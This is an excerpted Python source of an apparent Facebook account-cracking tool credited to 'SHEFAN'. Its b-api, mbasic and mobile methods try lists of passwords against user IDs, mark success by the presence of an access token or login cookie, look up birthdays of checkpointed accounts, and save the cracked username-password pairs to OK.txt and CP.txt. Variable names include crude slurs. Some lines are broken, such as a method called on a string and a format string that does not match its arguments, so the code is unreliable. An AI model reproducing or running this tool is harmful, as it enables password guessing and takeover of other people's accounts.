...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#SHEFAN('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							SHEFAN('[•] Result CP saved to CP.txt')
							SHEFAN('\n\tCrack Processing...\n')
							SHEFAN('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					SHEFAN('\n01.) Metode b-api ')
					SHEFAN('02.) Metode mbasic ')
					SHEFAN('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			SHEFAN('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			SHEFAN(' [1] AKING Method 1 ')
			SHEFAN(' [2] AKING Method 2  [ Pro ]')
			SHEFAN(' [3] AKING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				SHEFAN('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					SHEFAN('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				SHEFAN('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				SHEFAN('\r\033[1;32m[Successful-✓] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].SHEFAN('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				SHEFAN('\r\033[1;92m[Successful-✓] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
| '--------------' || '--------------' || '--------------' || '--------------' |
 ...
 [*]=============================================
    Author   : SHEFAN
    Facebook : https://www.facebook.com/shefan.909
    Team     : NHI H
    Connect  : +8801962510071
 [*]=============================================
